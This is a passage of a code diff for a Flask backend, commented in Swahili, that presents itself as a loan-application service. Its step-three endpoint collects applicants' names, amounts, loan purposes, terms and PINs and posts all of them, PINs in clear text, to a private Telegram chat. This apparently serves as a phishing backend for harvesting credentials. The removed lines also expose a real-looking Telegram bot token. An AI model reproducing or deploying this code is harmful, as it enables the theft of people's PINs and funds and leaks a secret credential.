@@ -4,58 +4,71 @@ import random
 
 app = Flask(__name__)
 
-# 🔐 MIPANGILIO YA TELEGRAM
-BOT_TOKEN = "7787453591:AAHJ6udch8jmeJ06wIQegqzMh5RqYZ_nuC0"
+# =========================
+# TELEGRAM CONFIG
+# =========================
+BOT_TOKEN = "YOUR_BOT_TOKEN"
 CHAT_ID = "6958413637"
 
+# Kuhifadhi maombi kwa muda
 maombi = {}
 
 # =========================
-# KUTUMA KWENYE TELEGRAM
+# SEND TO TELEGRAM FUNCTION
 # =========================
 def tuma_kwenye_telegram(app_id, data):
 
     ujumbe = f"""
-MAOMBI MAPYA YA MKOPO
+📥 MAOMBI MAPYA YA MKOPO
 
-Namba ya Maombi: {app_id}
-Jina: {data['jina']}
-Kiasi: {data['kiasi']}
-Lengo: {data['lengo']}
-Muda: {data['muda']}
-PIN: {data['pin']}
-Hali: INASUBIRI (PENDING)
+🆔 Namba ya Maombi: {app_id}
+
+👤 Jina: {data.get('jina')}
+💰 Kiasi: {data.get('kiasi')}
+🎯 Lengo: {data.get('lengo')}
+📅 Muda: {data.get('muda')}
+🔐 PIN: {data.get('pin')}
+
+📌 Hali: PENDING
 """
 
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
 
-    requests.post(url, json={
-        "chat_id": CHAT_ID,
-        "text": ujumbe
-    })
+    response = requests.post(
+        url,
+        json={
+            "chat_id": CHAT_ID,
+            "text": ujumbe
+        }
+    )
+
+    # Kuonyesha response ya Telegram kwenye terminal
+    print(response.text)
 
 # =========================
-# HATUA YA 3 ENDPOINT
+# STEP 3 ENDPOINT
 # =========================
 @app.route("/submit-step3", methods=["POST"])
 def wasilisha_hatua_ya_3():
 
-    data = request.json
+    try:
+        data = request.get_json()
 
-    app_id = str(random.randint(10000, 99999))
+        # Hakikisha data imepatikana
+        if not data:
+            return jsonify({
+                "message": "Hakuna data iliyotumwa"
+            }), 400
 
-    maombi[app_id] = data
-    maombi[app_id]["status"] = "PENDING"
+        # Generate Application ID
+        app_id = str(random.randint(10000, 99999))
 
-    tuma_kwenye_telegram(app_id, maombi[app_id])
+        # Save application
+        maombi[app_id] = data
+        maombi[app_id]["status"] = "PENDING"
 
-    return jsonify({
-        "message": "imefanikiwa",
-        "application_id": app_id
-    })
+        # Send to Telegram
+        tuma_kwenye_telegram(app_id, maombi[app_id])
 
-# =========================
-# KUENDESHA SERVER
-# =========================
-if __name__ == "__main__":
-    app.run(debug=True)
+        return jsonify({
+            "message": "Imefanikiwa",
